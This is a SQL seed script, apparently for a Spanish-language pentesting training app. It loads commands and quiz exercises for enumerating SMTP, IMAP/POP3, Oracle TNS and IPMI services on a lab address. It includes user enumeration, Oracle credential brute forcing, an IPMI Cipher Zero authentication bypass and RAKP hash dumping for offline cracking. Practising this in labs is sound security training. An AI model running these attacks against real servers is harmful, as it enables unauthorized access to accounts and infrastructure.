    insert into public.tools (nombre, protocolo, descripcion) values ($q$SMTP$q$, $q$SMTP (25/465/587 tcp)$q$, $q$Simple Mail Transfer Protocol. Protocolo para envio de correo entre servidores. En enumeracion buscamos el banner del servidor, los comandos soportados (con EHLO) y sobre todo enumerar usuarios validos abusando de VRFY, EXPN y RCPT TO. Herramientas clave: nmap, telnet/nc y smtp-user-enum.$q$) returning id into t_id;
  insert into public.commands (tool_id, comando, descripcion) values
    (t_id, $q$nmap -sV -sC -p25 10.10.10.10$q$, $q$Escaneo de version y scripts por defecto sobre el puerto SMTP.$q$),
    (t_id, $q$nmap -p25 --script smtp-commands 10.10.10.10$q$, $q$Lista los comandos SMTP soportados por el servidor (EHLO, VRFY, EXPN, AUTH).$q$),
    (t_id, $q$nmap -p25 --script smtp-enum-users 10.10.10.10$q$, $q$Enumera usuarios validos usando VRFY/EXPN/RCPT con el script de nmap.$q$),
    (t_id, $q$telnet 10.10.10.10 25$q$, $q$Se conecta al puerto SMTP en modo interactivo para hablar el protocolo a mano.$q$),
    (t_id, $q$nc -nv 10.10.10.10 25$q$, $q$Se conecta al puerto SMTP con netcat, alternativa a telnet.$q$),
    (t_id, $q$VRFY root$q$, $q$Dentro de la sesion SMTP, verifica si el usuario root existe en el servidor.$q$),
    (t_id, $q$EXPN root$q$, $q$Dentro de la sesion SMTP, expande una lista o alias para revelar usuarios reales.$q$),
    (t_id, $q$smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10$q$, $q$Enumera usuarios validos por el metodo VRFY usando un wordlist.$q$),
    (t_id, $q$smtp-user-enum -M RCPT -U users.txt -t 10.10.10.10$q$, $q$Enumera usuarios validos por el metodo RCPT TO cuando VRFY esta deshabilitado.$q$);
  insert into public.exercises (tool_id, enunciado, respuestas_aceptadas, pista, explicacion) values
    (t_id, $q$Quieres hacer un escaneo de version y scripts por defecto sobre el puerto SMTP (25) de 10.10.10.10 con nmap. Escribe el comando.$q$, array[$q$nmap -sV -sC -p25 10.10.10.10$q$, $q$nmap -sC -sV -p25 10.10.10.10$q$, $q$nmap -sV -sC -p 25 10.10.10.10$q$]::text[], $q$Combina -sV con -sC y limita al puerto 25.$q$, $q$nmap -sV -sC -p25 10.10.10.10 saca el banner del servicio SMTP (Postfix, Exim, Sendmail) y corre los scripts por defecto, que ya te dicen los comandos soportados. Es el primer paso antes de intentar enumerar usuarios.$q$),
    (t_id, $q$Quieres listar los comandos SMTP que soporta el servidor 10.10.10.10 con el script smtp-commands de nmap. Escribe el comando.$q$, array[$q$nmap -p25 --script smtp-commands 10.10.10.10$q$, $q$nmap --script smtp-commands -p25 10.10.10.10$q$, $q$nmap -p 25 --script smtp-commands 10.10.10.10$q$]::text[], $q$Usa --script smtp-commands sobre el puerto 25.$q$, $q$nmap -p25 --script smtp-commands 10.10.10.10 dice que verbos SMTP acepta el servidor (VRFY, EXPN, AUTH, STARTTLS). Saber si VRFY o EXPN estan activos te dice si puedes enumerar usuarios validos por ese camino.$q$),
    (t_id, $q$Quieres conectarte en modo interactivo al puerto SMTP de 10.10.10.10 con telnet para hablar el protocolo a mano. Escribe el comando.$q$, array[$q$telnet 10.10.10.10 25$q$]::text[], $q$Es telnet, la IP y el puerto SMTP.$q$, $q$telnet 10.10.10.10 25 abre una sesion cruda con el servidor SMTP. Ya dentro puedes hacer HELO, VRFY, EXPN, MAIL FROM y RCPT TO para probar usuarios uno a uno o entender que responde el servidor.$q$),
    (t_id, $q$Estas dentro de una sesion SMTP interactiva y quieres verificar si el usuario root existe en el servidor. Escribe el comando SMTP.$q$, array[$q$VRFY root$q$, $q$vrfy root$q$]::text[], $q$El verbo SMTP para verificar un usuario son cuatro letras que empiezan por V.$q$, $q$VRFY root le pregunta al servidor si el usuario root existe. Si responde 250 o 252, el usuario es valido; si responde 550, no existe. Es el metodo clasico para enumerar cuentas validas cuando VRFY esta habilitado.$q$),
    (t_id, $q$Quieres enumerar usuarios validos en 10.10.10.10 por el metodo VRFY, usando la wordlist users.txt con smtp-user-enum. Escribe el comando.$q$, array[$q$smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10$q$, $q$smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10 -p 25$q$]::text[], $q$smtp-user-enum usa -M para el metodo, -U para el wordlist y -t para el target.$q$, $q$smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10 automatiza lo que harias a mano con VRFY, probando cada nombre de la lista y quedandose con los validos. Si VRFY no funciona, se cambia el metodo con -M RCPT.$q$);
    insert into public.tools (nombre, protocolo, descripcion) values ($q$IMAP/POP3$q$, $q$IMAP (143/993 tcp) POP3 (110/995 tcp)$q$, $q$Protocolos de lectura de correo. POP3 descarga los mensajes al cliente, IMAP los mantiene sincronizados en el servidor. En enumeracion buscamos el banner, mecanismos de autenticacion soportados, si hay TLS y probamos credenciales validas. Herramientas clave: nmap, openssl s_client y curl.$q$) returning id into t_id;
  insert into public.commands (tool_id, comando, descripcion) values
    (t_id, $q$nmap -sV -sC -p110,143,993,995 10.10.10.10$q$, $q$Escaneo de version y scripts por defecto sobre los puertos de POP3 e IMAP (plano y TLS).$q$),
    (t_id, $q$nmap -p110,143 --script pop3-capabilities,imap-capabilities 10.10.10.10$q$, $q$Lista las capacidades soportadas por los servidores POP3 e IMAP.$q$),
    (t_id, $q$nmap -p143 --script imap-ntlm-info 10.10.10.10$q$, $q$Si IMAP soporta NTLM, extrae informacion del dominio y del host a traves del challenge.$q$),
    (t_id, $q$openssl s_client -connect 10.10.10.10:993 -crlf -quiet$q$, $q$Se conecta a IMAPS (IMAP sobre TLS) para interactuar con el servicio cifrado.$q$),
    (t_id, $q$openssl s_client -connect 10.10.10.10:995 -crlf -quiet$q$, $q$Se conecta a POP3S (POP3 sobre TLS) para interactuar con el servicio cifrado.$q$),
    (t_id, $q$curl -k 'imaps://10.10.10.10' --user <usuario>:<contrasena>$q$, $q$Se autentica contra IMAPS con curl y lista carpetas del buzon.$q$),
    (t_id, $q$curl -k 'pop3s://10.10.10.10' --user <usuario>:<contrasena>$q$, $q$Se autentica contra POP3S con curl y lista los mensajes disponibles.$q$);
  insert into public.exercises (tool_id, enunciado, respuestas_aceptadas, pista, explicacion) values
    (t_id, $q$Quieres hacer un escaneo de version y scripts por defecto sobre los cuatro puertos de POP3 e IMAP (110, 143, 993, 995) en 10.10.10.10. Escribe el comando.$q$, array[$q$nmap -sV -sC -p110,143,993,995 10.10.10.10$q$, $q$nmap -sC -sV -p110,143,993,995 10.10.10.10$q$]::text[], $q$Combina -sV y -sC con la lista de los cuatro puertos separados por coma.$q$, $q$nmap -sV -sC -p110,143,993,995 10.10.10.10 cubre POP3 (110), IMAP (143) y sus versiones sobre TLS (995 y 993). Trae banner, capacidades y si aceptan STARTTLS. Es el arranque obligatorio antes de autenticarte o probar credenciales.$q$),
    (t_id, $q$Quieres listar las capacidades soportadas por los servicios POP3 e IMAP de 10.10.10.10 en un solo comando con nmap. Escribe el comando.$q$, array[$q$nmap -p110,143 --script pop3-capabilities,imap-capabilities 10.10.10.10$q$, $q$nmap --script pop3-capabilities,imap-capabilities -p110,143 10.10.10.10$q$]::text[], $q$Junta los scripts pop3-capabilities e imap-capabilities separados por coma en --script.$q$, $q$nmap -p110,143 --script pop3-capabilities,imap-capabilities 10.10.10.10 dice que mecanismos de autenticacion (LOGIN, PLAIN, NTLM, CRAM-MD5) y extensiones acepta el servidor. Saber si hay PLAIN sin TLS o si acepta NTLM te orienta el ataque.$q$),
    (t_id, $q$Quieres abrir una sesion cifrada con IMAPS (puerto 993) en 10.10.10.10 usando openssl s_client, en modo silencioso y con salto de linea CRLF. Escribe el comando.$q$, array[$q$openssl s_client -connect 10.10.10.10:993 -crlf -quiet$q$, $q$openssl s_client -connect 10.10.10.10:993 -quiet -crlf$q$]::text[], $q$Es openssl s_client, con -connect IP:993 y los flags -crlf y -quiet.$q$, $q$openssl s_client -connect 10.10.10.10:993 -crlf -quiet te da el equivalente de telnet pero sobre TLS. -crlf manda saltos de linea correctos y -quiet oculta el ruido del handshake para hablar IMAP directo (a1 LOGIN usuario pass, a2 LIST, etc.).$q$),
    (t_id, $q$Quieres autenticarte contra IMAPS en 10.10.10.10 con el usuario admin y la contrasena secret usando curl, aceptando el certificado autofirmado. Escribe el comando.$q$, array[$q$curl -k 'imaps://10.10.10.10' --user admin:secret$q$, $q$curl -k imaps://10.10.10.10 --user admin:secret$q$, $q$curl -k 'imaps://10.10.10.10' -u admin:secret$q$, $q$curl -k imaps://10.10.10.10 -u admin:secret$q$]::text[], $q$curl con -k para ignorar el certificado, la URL imaps:// y --user usuario:contrasena.$q$, $q$curl -k 'imaps://10.10.10.10' --user admin:secret prueba credenciales contra IMAPS de forma rapida. -k acepta certificados autofirmados. Si las credenciales son buenas, curl te devuelve la lista de carpetas del buzon.$q$);
    insert into public.tools (nombre, protocolo, descripcion) values ($q$Oracle TNS$q$, $q$Oracle TNS (1521 tcp)$q$, $q$Transparent Network Substrate. Es el listener de Oracle Database, la puerta por donde los clientes piden conexion a las instancias. En enumeracion buscamos la version del listener, los SIDs disponibles y credenciales validas para conectarnos al servicio. Herramientas clave: nmap, odat (Oracle Database Attacking Tool) y sqlplus.$q$) returning id into t_id;
  insert into public.commands (tool_id, comando, descripcion) values
    (t_id, $q$nmap -sV -sC -p1521 10.10.10.10$q$, $q$Escaneo de version y scripts por defecto sobre el puerto del listener TNS.$q$),
    (t_id, $q$nmap -p1521 --script oracle-tns-version 10.10.10.10$q$, $q$Consulta la version exacta del listener Oracle a traves del script TNS.$q$),
    (t_id, $q$nmap -p1521 --script oracle-sid-brute 10.10.10.10$q$, $q$Fuerza por diccionario los SIDs (identificadores de instancia) del listener.$q$),
    (t_id, $q$odat all -s 10.10.10.10$q$, $q$Corre todos los modulos de odat contra el objetivo: version, SIDs, credenciales por defecto y mas.$q$),
    (t_id, $q$odat sidguesser -s 10.10.10.10 -p 1521$q$, $q$Enumera SIDs validos del listener por diccionario.$q$),
    (t_id, $q$odat passwordguesser -s 10.10.10.10 -p 1521 -d <SID> --accounts-file accounts.txt$q$, $q$Fuerza usuario y contrasena contra un SID conocido usando un archivo de cuentas.$q$),
    (t_id, $q$sqlplus <usuario>/<contrasena>@10.10.10.10:1521/<SID>$q$, $q$Se conecta a la base de datos Oracle con sqlplus usando usuario, contrasena y SID.$q$);
  insert into public.exercises (tool_id, enunciado, respuestas_aceptadas, pista, explicacion) values
    (t_id, $q$Quieres hacer un escaneo de version y scripts por defecto sobre el puerto del listener Oracle TNS (1521) en 10.10.10.10. Escribe el comando.$q$, array[$q$nmap -sV -sC -p1521 10.10.10.10$q$, $q$nmap -sC -sV -p1521 10.10.10.10$q$, $q$nmap -sV -sC -p 1521 10.10.10.10$q$]::text[], $q$Combina -sV con -sC y limita al puerto 1521.$q$, $q$nmap -sV -sC -p1521 10.10.10.10 confirma que hay un listener Oracle y lanza los scripts NSE relacionados. Con la version y los SIDs que aparezcan, ya puedes ir a odat o sqlplus.$q$),
    (t_id, $q$Quieres enumerar los SIDs validos del listener Oracle en 10.10.10.10 por diccionario usando el script oracle-sid-brute de nmap. Escribe el comando.$q$, array[$q$nmap -p1521 --script oracle-sid-brute 10.10.10.10$q$, $q$nmap --script oracle-sid-brute -p1521 10.10.10.10$q$]::text[], $q$Usa --script oracle-sid-brute sobre el puerto 1521.$q$, $q$nmap -p1521 --script oracle-sid-brute 10.10.10.10 prueba una lista de SIDs comunes (XE, ORCL, PROD) y te dice cuales acepta el listener. Sin un SID valido no puedes autenticarte contra la base, asi que es el paso anterior a probar credenciales.$q$),
    (t_id, $q$Quieres correr todos los modulos de odat de golpe contra el listener Oracle de 10.10.10.10. Escribe el comando.$q$, array[$q$odat all -s 10.10.10.10$q$, $q$odat all -s 10.10.10.10 -p 1521$q$]::text[], $q$El modulo 'all' de odat toma el servidor con -s.$q$, $q$odat all -s 10.10.10.10 hace la pasada completa: version del TNS, sidguesser, passwordguesser con cuentas por defecto y checks tipicos. Es el barrido rapido antes de ir manualmente con sqlplus.$q$),
    (t_id, $q$Averiguaste que el SID es XE y las credenciales scott/tiger funcionan en 10.10.10.10. Conectate con sqlplus al puerto 1521. Escribe el comando.$q$, array[$q$sqlplus scott/tiger@10.10.10.10:1521/XE$q$, $q$sqlplus scott/tiger@10.10.10.10/XE$q$]::text[], $q$sqlplus usa el formato usuario/contrasena@host:puerto/SID.$q$, $q$sqlplus scott/tiger@10.10.10.10:1521/XE te abre la sesion SQL contra la instancia XE. Ya dentro se hacen consultas normales de Oracle (select * from v$version, select username from all_users) para seguir enumerando.$q$);
    insert into public.tools (nombre, protocolo, descripcion) values ($q$IPMI$q$, $q$IPMI (623 udp)$q$, $q$Intelligent Platform Management Interface. Protocolo de gestion fuera de banda que usan las BMC (iDRAC, iLO, IMM) para administrar servidores fisicos. La version 2.0 tiene fallos conocidos como el volcado de hashes de autenticacion (cipher zero y RAKP), lo que la vuelve un objetivo jugoso. Herramientas clave: nmap, metasploit e ipmitool.$q$) returning id into t_id;
  insert into public.commands (tool_id, comando, descripcion) values
    (t_id, $q$nmap -sU -p623 10.10.10.10$q$, $q$Escaneo del puerto 623 sobre UDP para confirmar que el servicio IPMI esta activo.$q$),
    (t_id, $q$nmap -sU -p623 --script ipmi-version 10.10.10.10$q$, $q$Consulta la version del servicio IPMI y los mecanismos de autenticacion soportados.$q$),
    (t_id, $q$nmap -sU -p623 --script ipmi-cipher-zero 10.10.10.10$q$, $q$Verifica si el servicio es vulnerable a IPMI Cipher Zero, que permite login sin contrasena.$q$),
    (t_id, $q$msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.10.10; run'$q$, $q$Vuelca los hashes RAKP de IPMI 2.0 con el modulo auxiliar de Metasploit para crackearlos offline.$q$),
    (t_id, $q$ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin user list$q$, $q$Lista los usuarios de la BMC autenticandose por lanplus con credenciales validas.$q$),
    (t_id, $q$ipmitool -I lanplus -C 0 -H 10.10.10.10 -U admin -P '' user list$q$, $q$Explota IPMI Cipher Zero (-C 0) para listar usuarios sin necesidad de contrasena valida.$q$);
  insert into public.exercises (tool_id, enunciado, respuestas_aceptadas, pista, explicacion) values
    (t_id, $q$Quieres confirmar que el servicio IPMI esta activo en 10.10.10.10 escaneando su puerto, recordando que IPMI corre sobre UDP. Escribe el comando de nmap.$q$, array[$q$nmap -sU -p623 10.10.10.10$q$, $q$sudo nmap -sU -p623 10.10.10.10$q$, $q$nmap -p623 -sU 10.10.10.10$q$]::text[], $q$IPMI no es TCP, tienes que usar el tipo de escaneo de UDP y el puerto 623.$q$, $q$nmap -sU -p623 10.10.10.10 escanea el puerto 623 sobre UDP. El detalle clave es -sU, porque IPMI usa UDP y un escaneo TCP normal no lo veria. Confirmar que esta abierto es el arranque antes de sacar la version o probar cipher zero.$q$),
    (t_id, $q$Quieres consultar la version del servicio IPMI de 10.10.10.10 y sus mecanismos de autenticacion usando el script ipmi-version de nmap. Escribe el comando.$q$, array[$q$nmap -sU -p623 --script ipmi-version 10.10.10.10$q$, $q$nmap --script ipmi-version -sU -p623 10.10.10.10$q$]::text[], $q$Combina -sU, -p623 y --script ipmi-version.$q$, $q$nmap -sU -p623 --script ipmi-version 10.10.10.10 devuelve la version del IPMI y los cifrados/autenticaciones soportadas. Es lo que te dice si estas frente a una BMC con IPMI 2.0 vulnerable a Cipher Zero o al volcado de hashes RAKP.$q$),
    (t_id, $q$Quieres verificar si el IPMI de 10.10.10.10 es vulnerable a IPMI Cipher Zero con el script correspondiente de nmap. Escribe el comando.$q$, array[$q$nmap -sU -p623 --script ipmi-cipher-zero 10.10.10.10$q$, $q$nmap --script ipmi-cipher-zero -sU -p623 10.10.10.10$q$]::text[], $q$Igual que el anterior pero cambiando el script a ipmi-cipher-zero.$q$, $q$nmap -sU -p623 --script ipmi-cipher-zero 10.10.10.10 confirma si el servicio acepta Cipher Suite 0, que permite autenticarte con cualquier usuario y sin contrasena. Si el script reporta VULNERABLE, ya puedes usar ipmitool -C 0 para entrar.$q$),
    (t_id, $q$El IPMI de 10.10.10.10 es vulnerable a Cipher Zero. Usa ipmitool por lanplus para listar los usuarios de la BMC, con el usuario admin y sin contrasena. Escribe el comando.$q$, array[$q$ipmitool -I lanplus -C 0 -H 10.10.10.10 -U admin -P '' user list$q$, $q$ipmitool -I lanplus -C 0 -H 10.10.10.10 -U admin -P "" user list$q$]::text[], $q$ipmitool con -I lanplus, -C 0 para cipher zero, -H el host, -U admin, -P vacio y el subcomando user list.$q$, $q$ipmitool -I lanplus -C 0 -H 10.10.10.10 -U admin -P '' user list explota Cipher Zero para listar los usuarios de la BMC sin necesidad de credenciales validas. Con la lista de usuarios ya puedes crear una contrasena nueva o resetear una existente.$q$),
    (t_id, $q$Quieres volcar los hashes RAKP de IPMI 2.0 de 10.10.10.10 con el modulo auxiliar ipmi_dumphashes de Metasploit para crackearlos offline. Escribe el comando.$q$, array[$q$msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.10.10; run'$q$, $q$msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.10.10; run"$q$]::text[], $q$Es msfconsole -q -x con la secuencia use ...ipmi_dumphashes; set RHOSTS ...; run entre comillas.$q$, $q$msfconsole -q -x '...ipmi_dumphashes; set RHOSTS 10.10.10.10; run' aprovecha el bug de diseno de IPMI 2.0 que entrega el hash RAKP-HMAC-SHA1 del usuario antes de completar el login. Ese hash se crackea despues con hashcat modo 7300 y suele caer rapido porque muchas BMC llevan contrasenas de fabrica.$q$);
